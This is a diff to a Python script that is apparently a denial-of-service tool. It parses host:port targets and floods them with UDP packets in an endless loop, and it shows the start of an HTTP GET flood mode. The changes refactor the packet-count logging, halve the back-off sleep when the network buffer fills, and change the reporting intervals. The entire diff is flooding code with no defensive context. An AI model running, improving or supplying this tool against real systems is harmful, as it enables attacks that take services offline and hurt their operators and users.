@@ -45,7 +45,7 @@ def parse_argv(argv: list) -> tuple[str, list[tuple[str, int]]]:
         targets.append((target.split(":")[0], int(target.split(":")[1])))
     return action, targets
 
-def cycle(func, counter: int, startfrom = 0, iserr=False):
+def cycle(func, counter: int, startfrom = 0, prefix="  "):
     try:
         sent = startfrom
         while 1:
@@ -53,20 +53,19 @@ def cycle(func, counter: int, startfrom = 0, iserr=False):
             sent += 1
 
             if sent % counter == 0:
-                print(f"{"  " if not iserr else ""}Sent {sent} packets")
-                iserr = False
+                print(f"{prefix}Sent {sent} packets")
+                prefix = "  "
     except KeyboardInterrupt:
         print(f"\nStopping... ({target[0]})")
         return
     except OSError as e:
         if e.errno == 55:
             try:
-                print("O ", end="")
-                time.sleep(0.5)
+                time.sleep(0.25)
             except KeyboardInterrupt:
                 print(f"\nStopping... ({target[0]})")
                 return
-            cycle(func, counter, sent, True)
+            cycle(func, counter, sent, "O ")
         else:
             print(f"Got an error: {e}. Continue?")
             try:
@@ -102,7 +101,7 @@ def dos(target: tuple[str, int], method: str):
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.sendto(packet, (ip, target[1]))
                 s.close()
-            cycle(udp, 500 if method=="l-udp" else (750 if method=="udp" else 1250))
+            cycle(udp, 500 if method=="l-udp" else (1000 if method=="udp" else 2000))
         case "http-get":
             print(f"Sending HTTP Requests. Mode: GET")
             def get():
